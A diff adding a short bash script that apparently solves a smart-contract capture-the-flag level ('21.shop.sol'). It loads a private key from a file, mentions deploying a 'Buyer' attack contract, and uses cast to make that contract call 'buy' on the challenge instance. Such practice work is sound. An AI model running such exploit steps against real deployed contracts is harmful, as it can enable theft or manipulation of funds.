@@ -1,0 +1,12 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+#
+CON=0x93f9FF8A7e3Dd354CC6d75EC269D7B67DD5Cd492
+
+# forge create --private-key $KEY '21.shop.sol:Buyer'
+HACK=0xbd3e202e5d65b1c506adea83fd41c53799c6d565
+
+cast send --private-key $KEY $HACK 'buy(address)' $CON
